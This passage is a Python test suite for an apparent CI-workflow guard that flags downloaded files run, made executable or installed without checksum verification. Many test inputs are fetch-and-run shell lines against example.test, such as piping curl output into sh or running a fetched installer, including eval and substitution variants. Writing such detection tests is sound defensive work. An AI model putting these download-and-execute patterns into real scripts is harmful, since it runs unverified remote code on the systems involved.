    def test_a_checksum_naming_the_file_clears_the_glob(self):
        for dest in ("cuda_1.run", "./cuda_1.run"):
            for use in ("chmod +x ./cuda_*.run\n", "sh ./cuda_*.run\n"):
                with self.subTest(dest=dest, use=use):
                    self.assertEqual([], self.job(dest, self.CHECK + use))

    def test_a_glob_that_cannot_match_is_not_a_use(self):
        for dest in ("cuda_1.run", "./cuda_1.run"):
            for use in ("chmod +x ./other_*.run\n", "sh ./other_*.run\n"):
                with self.subTest(dest=dest, use=use):
                    self.assertEqual([], self.job(dest, use))


class TestAGlobMatchCarriedThroughAValue(unittest.TestCase):
    """#2585: a live glob keeps naming its match after the shell stores it."""

    GET = "curl -fsSLo cuda_1.run https://example.test/cuda_1.run\n"
    CHECK = 'echo "%s  cuda_1.run" | sha256sum -c -\n' % ("a" * 64)
    TARGETS = (
        'for f in ./cuda_*.run; do sh "$f"; done\n',
        'set -- ./cuda_*.run; sh "$1"\n',
        'f() { sh "$1"; }; f ./cuda_*.run\n',
    )

    def job(self, use):
        return [why for _name, why in wg.job_defects([("step", self.GET + use)])]

    def test_a_match_reaches_a_loop_positional_or_function_value(self):
        for use in self.TARGETS:
            with self.subTest(use=use):
                found = self.job(use)
                self.assertEqual(1, len(found), found)
                self.assertIn("running it under `sh`", found[0])

    def test_a_checksum_ahead_of_the_binding_clears_each_use(self):
        for use in self.TARGETS:
            with self.subTest(use=use):
                self.assertEqual([], self.job(self.CHECK + use))

    def test_each_positional_value_keeps_its_own_operand(self):
        for use in ('set -- other ./cuda_*.run; sh "$2"\n',
                    'f() { sh "$2"; }; f other ./cuda_*.run\n'):
            with self.subTest(use=use):
                self.assertIn("running it under `sh`", "".join(self.job(use)))
        for use in ('set -- other ./cuda_*.run; sh "$1"\n',
                    'f() { sh "$1"; }; f other ./cuda_*.run\n'):
            with self.subTest(use=use):
                self.assertEqual([], self.job(use))

    def test_shift_reindexes_the_remaining_positional_values(self):
        uses = (
            'set -- ./cuda_*.run; shift 0; sh "$1"\n',
            'set -- other ./cuda_*.run; shift; sh "$1"\n',
            'set -- other other ./cuda_*.run; shift 2; sh "$1"\n',
            'f() { shift; sh "$1"; }; f other ./cuda_*.run\n',
            'set -- ./cuda_*.run; shift 2; sh "$1"\n',
            'set -- other ./cuda_*.run; shift 3; sh "$2"\n',
            'set -- other ./cuda_*.run; false && shift; sh "$1"\n',
            ('set -- other ./cuda_*.run; if false; then shift; fi; '
             'sh "$1"\n'),
        )
        for use in uses:
            with self.subTest(use=use):
                self.assertIn("running it under `sh`", "".join(self.job(use)))
        self.assertEqual([], self.job(
            'set -- ./cuda_*.run; shift; sh "$1"\n'
        ))
        self.assertEqual([], self.job(
            'set -- other ./cuda_*.run; shift 2; sh "$1"\n'
        ))

    def test_all_positionals_flow_to_a_loop_and_the_first_flows_to_a_shell(self):
        uses = (
            'set -- ./cuda_*.run; sh "$@"\n',
            'set -- ./cuda_*.run; sh "$*"\n',
            'set -- other ./cuda_*.run; for f in "$@"; do sh "$f"; done\n',
            ('f() { for value in "$@"; do sh "$value"; done; }; '
             'f other ./cuda_*.run\n'),
        )
        for use in uses:
            with self.subTest(use=use):
                self.assertIn("running it under `sh`", "".join(self.job(use)))
        self.assertEqual([], self.job(
            'set -- other ./cuda_*.run; sh "$@"\n'
        ))

    def test_a_bound_value_can_be_passed_on_to_a_function_argument(self):
        uses = ('run() { sh "$1"; }; '
                'for f in ./cuda_*.run; do run "$f"; done\n',
                'run() { sh "$1"; }; set -- ./cuda_*.run; run "$1"\n')
        for use in uses:
            with self.subTest(use=use):
                self.assertIn("running it under `sh`", "".join(self.job(use)))

    def test_a_function_defined_before_the_fetch_can_receive_the_match(self):
        script = ('run() { sh "$1"; }; ' + self.GET +
                  'run ./cuda_*.run\n')
        self.assertIn("running it under `sh`", wg.fetch_exec_defect(script) or "")

    def test_an_unset_or_unexecuted_definition_does_not_invent_a_function_call(self):
        uses = ('run() { sh "$1"; }; unset -f run; run ./cuda_*.run\n',
                'if false; then run() { sh "$1"; }; fi; run ./cuda_*.run\n')
        for use in uses:
            with self.subTest(use=use):
                self.assertEqual([], self.job(use))
        use = ('run() { sh "$1"; }; false && unset -f run; '
               'run ./cuda_*.run\n')
        self.assertIn("running it under `sh`", "".join(self.job(use)))

    def test_a_quoted_or_nonmatching_pattern_is_not_carried(self):
        for pattern in ("'./cuda_*.run'", "./other_*.run"):
            for template in ('for f in %s; do sh "$f"; done\n',
                             'set -- %s; sh "$1"\n',
                             'f() { sh "$1"; }; f %s\n'):
                with self.subTest(pattern=pattern, template=template):
                    found = self.job(template % pattern)
                    if pattern.startswith("'") and template.startswith("for"):
                        # #2425's admitted over-report, the quoting price, as
                        # `p=./cuda_*.run; sh "$p"` is in test_workflow_values: bash walks
                        # the quoted header's one word and runs nothing (bash 5.2, bash 3.2,
                        # dash and a runner's bash each fetch only), but the reader drops
                        # the quotes, so the step's value table hands `$f` a live pattern.
                        self.assertEqual(1, len(found), found)
                        self.assertIn("-> cuda_1.run and running it under `sh`", found[0])
                    else:
                        self.assertEqual([], found)

    def test_reassignment_clears_the_carried_match(self):
        for use in ('for f in ./cuda_*.run; do f=other.run; sh "$f"; done\n',
                    'set -- ./cuda_*.run; set -- other.run; sh "$1"\n',
                    'f() { set -- other.run; sh "$1"; }; f ./cuda_*.run\n'):
            with self.subTest(use=use):
                self.assertEqual([], self.job(use))

    def test_a_command_environment_or_export_does_not_clear_the_shell_value(self):
        for use in ('for f in ./cuda_*.run; do f=other.run true; sh "$f"; done\n',
                    'for f in ./cuda_*.run; do export f; sh "$f"; done\n'):
            with self.subTest(use=use):
                self.assertIn("running it under `sh`", "".join(self.job(use)))

    def test_a_reassignment_that_may_not_run_does_not_clear_the_match(self):
        uses = (
            'for f in ./cuda_*.run; do false && f=other.run; sh "$f"; done\n',
            'for f in ./cuda_*.run; do if false; then f=other.run; fi; sh "$f"; done\n',
            'for f in ./cuda_*.run; do ( f=other.run ); sh "$f"; done\n',
            ('for f in ./cuda_*.run; do while false; do f=other.run; done; '
             'sh "$f"; done\n'),
            ('f() { false && set -- other.run; sh "$1"; }; '
             'f ./cuda_*.run\n'),
            ('f() { if false; then set -- other.run; fi; sh "$1"; }; '
             'f ./cuda_*.run\n'),
        )
        for use in uses:
            with self.subTest(use=use):
                self.assertIn("running it under `sh`", "".join(self.job(use)))

    def test_shell_values_do_not_cross_a_workflow_step_boundary(self):
        bindings = ('for f in ./cuda_*.run; do :; done\n',
                    'set -- ./cuda_*.run\n',
                    'f() { sh "$1"; }\n')
        uses = ('sh "$f"\n', 'sh "$1"\n', 'f ./cuda_*.run\n')
        for binding, use in zip(bindings, uses, strict=True):
            with self.subTest(binding=binding, use=use):
                steps = [("bind", self.GET + binding), ("use", use)]
                self.assertEqual([], wg.job_defects(steps))

    def test_a_function_directory_change_keeps_only_absolute_matches_live(self):
        self.assertEqual([], self.job(
            'f() { cd /; sh "$1"; }; f ./cuda_*.run\n'
        ))
        get = "curl -fsSLo /opt/cuda_1.run https://example.test/cuda_1.run\n"
        absolute = (
            'for f in /opt/cuda_*.run; do cd sub; sh "$f"; done\n',
            'f() { cd sub; sh "$1"; }; f /opt/cuda_*.run\n',
        )
        for use in absolute:
            with self.subTest(kind="absolute", use=use):
                found = wg.fetch_exec_defect(get + use)
                self.assertIn("running it under `sh`", found or "")

    def test_the_direct_glob_remains_the_must_trip_control(self):
        self.assertIn("running it under `sh`", "".join(self.job("sh ./cuda_*.run\n")))


class TestAQuotedGlobIsALiteralOperand(unittest.TestCase):
    """#2432: only unquoted pattern characters make a shell glob."""

    GET = "curl -fsSLo cuda_1.run https://example.test/cuda_1.run\n"

    def job(self, use):
        return [why for _name, why in wg.job_defects([("step", self.GET + use)])]

    def test_a_fully_quoted_pattern_does_not_name_the_download(self):
        for operand in ('"./cuda_*.run"', "'./cuda_?.run'", '"cuda_[1].run"'):
            for command in ("sh", "chmod +x"):
                with self.subTest(command=command, operand=operand):
                    self.assertEqual([], self.job("%s %s\n" % (command, operand)))

    def test_an_unquoted_pattern_still_names_the_download(self):
        for operand in ("./cuda_*.run", "./cuda_?.run", "cuda_[1].run"):
            with self.subTest(operand=operand):
                found = self.job("sh %s\n" % operand)
                self.assertEqual(1, len(found), found)
                self.assertIn("running it under `sh`", found[0])

    def test_quoted_literal_parts_do_not_hide_an_unquoted_pattern(self):
        found = self.job('sh "./cuda_"*.run\n')
        self.assertEqual(1, len(found), found)
        self.assertIn("running it under `sh`", found[0])

    def test_a_quoted_literal_part_of_an_exact_name_still_names_it(self):
        for operand in ('./cuda_"1".run', '"./cuda_"1.run'):
            with self.subTest(operand=operand):
                found = self.job("sh %s\n" % operand)
                self.assertEqual(1, len(found), found)
                self.assertIn("running it under `sh`", found[0])

    def test_eval_reparses_separate_words_and_makes_their_globs_live(self):
        for use in ('eval sh "./cuda_*.run"', 'eval bash "./cuda_*.run"',
                    'eval chmod +x "./cuda_*.run"', 'eval chmod +x cuda_"[1]".run',
                    'eval chmod +x -- "./cuda_*.run"', 'eval "chmod" +x "./cuda_*.run"',
                    'eval chmod +x "cuda_?.run"', 'eval tar -xzf "./cuda_*.run"',
                    'eval source "./cuda_*.run"'):
            with self.subTest(use=use):
                downloads = [why for why in self.job(use + "\n") if why.startswith("fetches ")]
                self.assertEqual(1, len(downloads), downloads)
                self.assertIn("under `eval`", downloads[0])

    def test_eval_reparses_brace_lists_and_ranges(self):
        for use in ('eval sh "./cuda_{1,2}.run"', "eval sh ./cuda_{1,2}.run",
                    'eval sh "./cuda_{1..2}.run"', 'eval sh "./cuda_{01..02}.run"'):
            with self.subTest(use=use):
                downloads = [why for why in self.job(use + "\n")
                             if why.startswith("fetches ")]
                self.assertEqual(1, len(downloads), downloads)
                self.assertIn("under `eval`", downloads[0])

    def test_eval_braces_that_exclude_the_download_stay_unbound(self):
        for use in ('eval sh "./cuda_{2,3}.run"', "eval sh ./cuda_{2,3}.run",
                    'eval sh "./cuda_{2..3}.run"', 'eval sh "./cuda_{02..03}.run"'):
            with self.subTest(use=use):
                downloads = [why for why in self.job(use + "\n")
                             if why.startswith("fetches ")]
                self.assertEqual([], downloads)

    def test_braces_quoted_from_the_running_parse_stay_literal(self):
        for use in ('sh "./cuda_{1,2}.run"', 'eval \'sh "./cuda_{1,2}.run"\''):
            with self.subTest(use=use):
                downloads = [why for why in self.job(use + "\n")
                             if why.startswith("fetches ")]
                self.assertEqual([], downloads)

    def test_an_ordinary_pattern_keeps_literal_braces_fail_closed(self):
        script = ("curl -fsSLo 'cuda_{1,2}x.run' https://example.test/cuda.run\n"
                  "sh ./cuda_\\{1,2\\}*.run\n")
        downloads = [why for _name, why in wg.job_defects([("step", script)])
                     if why.startswith("fetches ")]
        self.assertEqual(1, len(downloads), downloads)

    def test_eval_keeps_quotes_that_are_inside_its_single_script_word(self):
        for use in ("eval 'sh \"./cuda_*.run\"'", "eval 'chmod +x \"./cuda_*.run\"'"):
            with self.subTest(use=use):
                self.assertFalse(any(why.startswith("fetches ") for why in self.job(use + "\n")))

    def test_eval_reparsed_glob_keeps_a_lifted_substitution_readable(self):
        found = self.job('eval sh "./cuda_$(printf 1)*.run"\n')
        downloads = [why for why in found if why.startswith("fetches ")]
        self.assertEqual(1, len(downloads), downloads)
        self.assertIn("under `eval`", downloads[0])
        self.assertNotIn("@@shell-", downloads[0])


class TestADollarSpelledPathOnEitherSideBindsByItsLastPart(unittest.TestCase):
    """#2345 (a), (b): after `curl -o cuda_1.run`, `sh "$PWD/cuda_1.run"` read
    clean -- #2310 read a word bash expands only where the COMMAND stands --
    and so did `sh ./cuda_*.run` after `curl -o "$PWD/cuda_1.run"`; bash 3.2
    and 5.2 run the download through each spelling. An operand bash expands
    whose last part is the download's basename is now the download, as a
    command word is, and a glob is matched against a download written to a
    `$`-spelled path by its last part. Loose on the side that RUNS only: a
    checksum still binds by its spelling."""

    GET = "curl -fsSLo %s https://example.test/cuda_1.run\n"
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)

    def job(self, script):
        return [why for _n, why in wg.job_defects([("step", script)])]

    def test_an_operand_ending_in_its_basename_is_the_download(self):
        get = self.GET % "cuda_1.run"
        for use, how in (("sh $PWD/cuda_1.run\n", "running it under `sh`"),
                         ('sh "$PWD/cuda_1.run"\n', "running it under `sh`"),
                         ('sh "${PWD}/cuda_1.run" --silent\n', "running it under `sh`"),
                         ('sh "$(pwd)/cuda_1.run"\n', "running it under `sh`"),
                         ('D=$PWD\nsh "$D/cuda_1.run"\n', "running it under `sh`"),
                         ('sudo bash "`pwd`/cuda_1.run"\n', "running it under `bash`"),
                         ('chmod +x "$PWD/cuda_1.run"\n', "making it executable"),
                         ('install -m 755 "$PWD/cuda_1.run" /usr/local/bin/c\n', "installing it"),
                         ('cp "$PWD/cuda_1.run" /usr/local/bin/\n', "putting it on PATH")):
            with self.subTest(use=use):
                why = self.job(get + use)
                self.assertEqual(1, len(why), why)
                self.assertIn("-> cuda_1.run and %s" % how, why[0])

    def test_wherever_the_fetch_put_it(self):
        # What `$HOME` expands to is not evaluated, so this is read as running
        # the download too, which bash does not do from the checkout: the
        # fail-closed side to be wrong on, as for a command word (#2310).
        self.assertIn("running it under `bash`", "".join(
            self.job(self.GET % "cuda_1.run" + 'bash "$HOME/cuda_1.run"\n')))

    def test_a_check_before_it_clears_it_and_binds_by_its_spelling(self):
        get = self.GET % "cuda_1.run"
        self.assertEqual([], self.job(get + self.CHECK % "cuda_1.run" + 'sh "$PWD/cuda_1.run"\n'))
        self.assertIn("no checksum in the job names cuda_1.run", "".join(
            self.job(get + self.CHECK % "$PWD/cuda_1.run" + 'sh "$PWD/cuda_1.run"\n')))

    def test_another_last_part_or_an_option_is_not_the_download(self):
        get = self.GET % "cuda_1.run"
        for use in ('sh "$PWD/other.run"\n', 'sh "$PWD/cuda_1.run.sig"\n',
                    'sh "$PWD/cuda_1.run/.."\n', 'echo "$PWD/cuda_1.run"\n',
                    'sh ./x.sh --file="$PWD/cuda_1.run"\n', 'sh "$PWD/${NAME}"\n'):
            with self.subTest(use=use):
                self.assertEqual([], self.job(get + use))
        # Its directory, walked, still covers what is in it.
        self.assertIn("making it executable", "".join(self.job(
            self.GET % '"$PWD/cuda_1.run"' + 'chmod -R +x "$PWD"\n')))

    def test_a_glob_binds_a_download_written_to_a_dollar_spelled_path(self):
        get = self.GET % '"$PWD/cuda_1.run"'
        for use, how in (("sh ./cuda_*.run\n", "running it under `sh`"),
                         ("sh cuda_*.run\n", "running it under `sh`"),
                         ("chmod +x ./cuda_*.run\n", "making it executable")):
            with self.subTest(use=use):
                why = self.job(get + use)
                self.assertEqual(1, len(why), why)
                self.assertIn("-> $PWD/cuda_1.run and %s" % how, why[0])
        for script in (get + "sh ./other_*.run\n",
                       get + self.CHECK % "$PWD/cuda_1.run" + "sh ./cuda_*.run\n"):
            with self.subTest(script=script):
                self.assertEqual([], self.job(script))


class TestADownloadRunFromADollarSpelledRedirection(unittest.TestCase):
    """#2426: an interpreter can read a fetched script from a redirection.

    The redirection path and the download destination use the same last-part
    binding as an interpreter operand when either side has a dynamic directory.
    """

    URL = "https://example.test/x.sh"
    GET = "curl -fsSLo x.sh %s\n" % URL
    DYNAMIC_GET = 'curl -fsSLo "$PWD/x.sh" %s\n' % URL
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)

    def job(self, script):
        return [why for _name, why in wg.job_defects([("step", script)])]

    def test_a_dynamic_source_path_is_the_download(self):
        for use, shell in (('bash < "$PWD/x.sh"\n', "bash"),
                           ('sh < "${PWD}/x.sh"\n', "sh"),
                           ('sh < "$(pwd)/x.sh"\n', "sh"),
                           ('D=$PWD\nbash < "$D/x.sh"\n', "bash")):
            with self.subTest(use=use):
                found = self.job(self.GET + use)
                self.assertEqual(1, len(found), found)
                self.assertIn("running it under `%s` from standard input" % shell, found[0])

    def test_a_dynamic_destination_binds_a_literal_source_basename(self):
        for source, shell in (("x.sh", "bash"), ("./x.sh", "sh"),
                              ("scripts/x.sh", "bash")):
            with self.subTest(source=source):
                found = self.job(self.DYNAMIC_GET + "%s < %s\n" % (shell, source))
                self.assertEqual(1, len(found), found)
                self.assertIn("-> $PWD/x.sh and running it under `%s` from standard input"
                              % shell, found[0])

    def test_another_path_or_a_non_interpreter_is_not_a_run(self):
        for script in (self.GET + 'bash < "$PWD/other.sh"\n',
                       self.GET + 'cat < "$PWD/x.sh"\n',
                       "curl -fsSLo /tmp/x.sh %s\nbash < /opt/x.sh\n" % self.URL):
            with self.subTest(script=script):
                self.assertEqual([], self.job(script))
        self.assertIn("running it under `bash` from standard input", "".join(
            self.job(self.GET + "bash < x.sh\n")))
        here_string = self.job(self.DYNAMIC_GET + "sh <<< 'x.sh'\n")
        self.assertEqual(1, len(here_string), here_string)
        self.assertNotIn("from standard input", here_string[0])

    def test_a_check_keeps_its_exact_spelling(self):
        self.assertEqual([], self.job(
            self.GET + self.CHECK % "x.sh" + 'bash < "$PWD/x.sh"\n'
        ))
        found = self.job(self.GET + 'bash < "$PWD/x.sh"\n' + self.CHECK % "x.sh")
        self.assertEqual(1, len(found), found)
        self.assertIn("only AFTER running it under `bash` from standard input", found[0])


class TestADownloadWrittenToADollarSpelledPathBindsByItsBasename(unittest.TestCase):
    """#2442: the mirror of #2345 (b), and a fail-open until it. After
    `curl -o "$PWD/cuda_1.run"`, both `sh cuda_1.run` and
    `chmod +x cuda_1.run; ./cuda_1.run` read CLEAN: a `$`-spelled OPERAND bound by its last part,
    but a `$`-spelled DESTINATION only through a glob, so the plain-name use
    -- the commoner spelling -- was unbound, while bash 3.2.57, bash 5.2.21,
    dash, zsh 5.9 and ksh 93u+ all run the download, a bare-name checksum
    failing in front of it changing nothing. A destination
    bash expands whose basename is written out is now that basename, taking
    the same fail-closed looseness the operand side already takes: a
    same-named file written somewhere else binds too. The checksum side stays
    exact (`names_file`), which is the documented asymmetry."""

    GET = 'curl -fsSLo "$PWD/cuda_1.run" https://example.test/cuda_1.run\n'
    BRACED = 'curl -fsSLo "${PWD}/cuda_1.run" https://example.test/cuda_1.run\n'
    CHECK = 'echo "%s  %%s" | sha256sum -c -\n' % ("a" * 64)

    def job(self, script):
        return [why for _n, why in wg.job_defects([("step", script)])]

    def test_a_literal_basename_is_the_download(self):
        for use, how in (("sh cuda_1.run\n", "running it under `sh`"),
                         ("sh ./cuda_1.run\n", "running it under `sh`"),
                         ("bash ./cuda_1.run --silent\n", "running it under `bash`"),
                         ("./cuda_1.run\n", "running it"),
                         ("chmod +x cuda_1.run\n", "making it executable"),
                         ("chmod +x ./cuda_1.run\n", "making it executable"),
                         ("chmod 755 cuda_1.run\n", "making it executable"),
                         ("install -m 755 cuda_1.run /usr/local/bin/c\n", "installing it")):
            with self.subTest(use=use):
                why = self.job(self.GET + use)
                self.assertEqual(1, len(why), why)
                self.assertIn("-> $PWD/cuda_1.run and %s with nothing verifying" % how, why[0])

    def test_the_braced_spelling_of_the_destination_too(self):
        why = self.job(self.BRACED + "chmod +x cuda_1.run\n./cuda_1.run\n")
        self.assertEqual(1, len(why), why)
        self.assertIn("-> ${PWD}/cuda_1.run and making it executable", why[0])

    def test_the_two_halves_of_making_it_executable_and_running_it(self):
        # The first use in the job is the one the sentence names, as elsewhere.
        for use in ("chmod +x cuda_1.run\n./cuda_1.run\n",
                    "chmod +x ./cuda_1.run\n./cuda_1.run\n"):
            with self.subTest(use=use):
                why = self.job(self.GET + use)
                self.assertEqual(1, len(why), why)
                self.assertIn("and making it executable", why[0])

    def test_a_same_named_file_elsewhere_binds_too(self):
        # The fail-closed looseness the operand rule already accepts: what
        # `$PWD` expands to is not evaluated, so a use of the same basename
        # under ANY directory -- or a bare name no PATH lookup would find --
        # is read as the download. Wrong on the side that over-reports, as
        # #2310 and #2345 are, because the alternative is reading the shell.
        for use, how in (("sh scripts/cuda_1.run\n", "running it under `sh`"),
                         ("sh /opt/cuda_1.run\n", "running it under `sh`"),
                         ("chmod +x bin/cuda_1.run\n", "making it executable"),
                         ("cuda_1.run --silent\n", "running it")):
            with self.subTest(use=use):
                why = self.job(self.GET + use)
                self.assertEqual(1, len(why), why)
                self.assertIn("-> $PWD/cuda_1.run and %s" % how, why[0])

    def test_another_basename_or_an_option_word_is_not_the_download(self):
        # `--file=./cuda_1.run` is the option word this arm must refuse: its
        # last path part IS the download's basename, so only "never an option
        # word" keeps a flag off a word that names a file to something else.
        for use in ("sh other.run\n", "sh cuda_1.run.sig\n", "chmod +x other.run\n",
                    'sh ./x.sh --file=cuda_1.run\n', 'sh ./x.sh --file=./cuda_1.run\n',
                    "echo cuda_1.run\n"):
            with self.subTest(use=use):
                self.assertEqual([], self.job(self.GET + use))
        # Must-trip control: the same job with the download's own basename.
        self.assertIn("running it under `sh`", "".join(self.job(self.GET + "sh cuda_1.run\n")))

    def test_a_destination_whose_basename_itself_expands_binds_nothing(self):
        # `curl -o "$PWD/$F"` has no name to bind: only the shell knows what
        # the last part says, so the plain-name use stays unread, as it was.
        for get in ('curl -fsSLo "$PWD/$F" https://example.test/cuda_1.run\n',
                    'curl -fsSLo "$PWD/${NAME}" https://example.test/cuda_1.run\n'):
            with self.subTest(get=get):
                self.assertEqual([], self.job(get + "sh cuda_1.run\n"))
        # Must-trip control: the same job with the basename written out.
        self.assertIn("running it under `sh`", "".join(self.job(self.GET + "sh cuda_1.run\n")))

    def test_a_lifted_substitution_is_carried_through_the_basename(self):
        # The layer's own invariant, under the rule: a destination whose
        # basename holds a `$(...)` the reader lifted OUT of the word is not a
        # name written out, and the marker text standing for it must never be
        # read as one -- `derived` keeps the provenance through the basename.
        # The rule above never reaches this: it reports such a destination
        # outright, with no use asked for, so the pin belongs here.
        subst = wg.fetches('curl -fsSLo "$PWD/$(date +%s).run" '
                           'https://example.test/x.run\n')[0].dest
        name = os.path.basename(os.path.normpath(subst))
        self.assertFalse(workflow_forms.covers(name, subst))
        self.assertFalse(workflow_forms.may_run(name, subst))
        self.assertIn("to an unknown destination ($(...)/cuda_1.run)", "".join(self.job(
            'curl -fsSLo "$(pwd)/cuda_1.run" https://example.test/cuda_1.run\n'
            "sh cuda_1.run\n")))
        # Control: the same basename written out beside a `$` the reader leaves
        # in the word is the mirror itself, at both doors.
        plain = wg.fetches(self.GET)[0].dest
        self.assertTrue(workflow_forms.covers("cuda_1.run", plain))
        self.assertTrue(workflow_forms.may_run("./cuda_1.run", plain))

    def test_the_checksum_side_still_binds_by_the_spelling_at_the_fetch(self):
        # `names_file` is word-exact and this destination is not bare, so a
        # checksum of the literal `cuda_1.run` does NOT credit a fetch to
        # `"$PWD/cuda_1.run"` -- main's behaviour, kept: the loosening is on
        # the side that RUNS only, or one checksum would clear another file.
        why = self.job(self.GET + self.CHECK % "cuda_1.run" + "sh cuda_1.run\n")
        self.assertEqual(1, len(why), why)
        self.assertIn("no checksum in the job names $PWD/cuda_1.run", why[0])
        # The spelling at the fetch clears it, as it always did.
        self.assertEqual([], self.job(self.GET + self.CHECK % "$PWD/cuda_1.run"
                                      + "sh cuda_1.run\n"))

    def test_a_literal_destination_is_unchanged(self):
        # Nothing moves where the fetch wrote a path with no `$` in it: the
        # mirror needs a destination the shell spells, so a use under another
        # directory still matches nothing (#2339's glob is the only reach) and
        # a bare name is still PATH's question alone (#2308).
        get = "curl -fsSLo /tmp/cuda_1.run https://example.test/cuda_1.run\n"
        for use in ("sh scripts/cuda_1.run\n", "sh /opt/cuda_1.run\n",
                    "cuda_1.run --silent\n", "chmod +x bin/cuda_1.run\n"):
            with self.subTest(use=use):
                self.assertEqual([], self.job(get + use))
        # Must-trip control: the spelling at the fetch is still the download.
        self.assertIn("running it under `sh`",
                      "".join(self.job(get + "sh /tmp/cuda_1.run\n")))


class TestAUseInsideACommandSubstitution(unittest.TestCase):
    """#2345 (c): `curl -o t.sh …; x=$(bash t.sh)` read clean, because a use
    was looked for in each command's own argv and never in the script a
    substitution runs; bash 3.2 and 5.2 run the download there. The guard's
    walk already reads every substitution as a script of its own for what it
    FETCHES; a use written there is now read the same way, at the statement
    that holds it, and the sentence says where it is."""

    GET = "curl -fsSLo t.sh https://example.test/t.sh\n"
    CHECK = 'echo "%s  t.sh" | sha256sum -c -\n' % ("a" * 64)

    def job(self, script):
        return [why for _n, why in wg.job_defects([("step", script)])]

    def test_a_use_inside_a_substitution_is_a_use(self):
        for use, how in (("x=$(bash t.sh)\n", "running it under `bash`"),
                         ('echo "$(sh t.sh)"\n', "running it under `sh`"),
                         ("x=`bash t.sh`\n", "running it under `bash`"),
                         ("diff <(bash t.sh) <(echo ok)\n", "running it under `bash`"),
                         ("x=$(echo $(sh ./t.sh))\n", "running it under `sh`"),
                         ("x=$(cat t.sh | sh)\n", "piping it into `sh`"),
                         ('if [ "$(bash t.sh)" = ok ]; then :; fi\n', "running it under `bash`"),
                         ("cat <<EOF\n$(bash t.sh)\nEOF\n", "running it under `bash`")):
            with self.subTest(use=use):
                why = self.job(self.GET + use)
                self.assertEqual(1, len(why), why)
                self.assertIn("-> t.sh and %s inside a command substitution with nothing"
                              % how, why[0])

    def test_run_by_its_path_inside_one(self):
        # An execute bit set before the fetch survives it, so `./t.sh` runs the
        # download with no `chmod` after it; with one, that is the first use.
        why = self.job("touch t.sh && chmod +x t.sh && " + self.GET + "v=$(./t.sh)\n")
        self.assertIn("-> t.sh and running it inside a command substitution", "".join(why))
        why = self.job(self.GET + "chmod +x t.sh\nv=$(./t.sh)\n")
        self.assertIn("-> t.sh and making it executable", "".join(why))

    def test_a_check_before_it_clears_it_and_one_after_it_does_not(self):
        self.assertEqual([], self.job(self.GET + self.CHECK + "x=$(bash t.sh)\n"))
        self.assertIn("verifies t.sh only AFTER running it under `bash` inside a command "
                      "substitution", "".join(self.job(self.GET + "x=$(bash t.sh)\n" + self.CHECK)))

    def test_a_check_beside_the_use_obeys_the_substitution_shells_gate(self):
        check = self.CHECK.rstrip()
        self.assertEqual([], self.job(self.GET + "x=$(%s && bash t.sh)\n" % check))
        for body in ("%s; bash t.sh" % check, "bash t.sh"):
            with self.subTest(body=body):
                why = self.job(self.GET + "x=$(%s)\n" % body)
                self.assertEqual(1, len(why), why)
                self.assertIn("running it under `bash` inside a command substitution", why[0])
        sibling = self.job(self.GET + "x=$(%s) y=$(bash t.sh)\n" % check)
        self.assertIn("inside another command-substitution context", "".join(sibling))
        self.assertEqual([], self.job(self.GET + "x=$(%s && y=$(bash t.sh))\n" % check))
        outside = self.job(self.GET + 'echo "$(%s)"\nbash t.sh\n' % check)
        self.assertIn("inside another command-substitution context", "".join(outside))

    def test_reading_it_or_running_another_file_there_is_not_a_use(self):
        for use in ("x=$(cat t.sh)\n", "x=$(bash other.sh)\n", "x=$(wc -l < t.sh)\n",
                    "x=$(sha256sum t.sh | cut -d' ' -f1)\n", 'x="$(grep -c . t.sh)"\n'):
            with self.subTest(use=use):
                self.assertEqual([], self.job(self.GET + use))


class TestASpacedCaseArmIsOnePattern(unittest.TestCase):
    """#2345 (d): bash and dash read `a | x)` as the arm `a|x)`, the spaces
    around `|` and inside `( ... )` separating nothing, and run its body when
    the word matches. The reader kept the spaces in the arm's text, and a
    stage split on them started with the pattern `a` and then a `|` where the
    command belonged, so the body behind it -- `curl … | sh` -- was never
    read as a command. The lexer now drops the unquoted spaces of a pattern
    list, which leaves the tight spelling already read."""

    BODY = "curl -fsSL https://example.test/i.sh | sh;;"
    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -' % ("a" * 64)

    def test_the_body_behind_a_spaced_arm_is_read(self):
        for arm in ("a | x)", "(a | x)", "\"a\" | 'x')", "( a | x )", "a\t|\tx)", "a | x )",
                    "b | a | x)", "a|x)"):
            for script in ('case "$X" in\n  %s %s\nesac\n' % (arm, self.BODY),
                           'case "$X" in\n  b | c) echo b;;\n  %s %s\nesac\n' % (arm, self.BODY),
                           'true && case "$X" in %s %s esac\n' % (arm, self.BODY)):
                with self.subTest(script=script):
                    why = wg.fetch_exec_defects(script)
                    self.assertEqual(1, len(why), why)
                    self.assertIn("hands https://example.test/i.sh straight to `sh`", why[0])

    def test_the_patterns_are_not_a_command(self):
        stmts = shell_reader.statements('case "$X" in\n  "a" | x) curl -fsSL u | sh;;\nesac\n')
        arm = next(st for st in stmts if shell_reader.is_arm(st.stages[0].argv[0]))
        self.assertEqual(["curl", "-fsSL", "u"], shell_reader.command(arm.stages[0].argv))
        self.assertEqual(["sh"], [str(w) for w in arm.stages[1].argv])

    def test_each_spaced_arm_is_a_branch_of_its_own(self):
        # Read, the use in the second arm is one the check in the first may
        # not have run before; beside it in one arm, the check clears it.
        other = (self.FETCH + 'case "$X" in\n  b | c) %s;;\n  a | d) chmod +x /tmp/payload;;\n'
                 "esac\n" % self.CHECK)
        self.assertIn("inside an `if`/`while` branch the use is not in",
                      wg.fetch_exec_defect(other) or "")
        same = (self.FETCH + 'case "$X" in\n  a | b) %s; chmod +x /tmp/payload;;\nesac\n'
                % self.CHECK)
        self.assertIsNone(wg.fetch_exec_defect(same))


class TestAGlobFromAnotherDirectoryReachesABareDownload(unittest.TestCase):
    """#2345 (e): the guard follows no `cd`, so `curl -o cuda_1.run …; cd s;
    sh ../cuda_*.run` read clean -- `../cuda_*.run` does not match the path
    `cuda_1.run` -- and bash 3.2 and 5.2 run the download from `s`. A glob
    whose directory part a bare download's name does not have is now matched
    by its last part; the same `../` on both sides was already a use."""

    GET = "curl -fsSLo %s https://example.test/cuda_1.run\n"
    CHECK = 'echo "%s  cuda_1.run" | sha256sum -c -\n' % ("a" * 64)

    def job(self, script):
        return [why for _n, why in wg.job_defects([("step", script)])]

    def test_a_glob_from_another_directory_is_a_use(self):
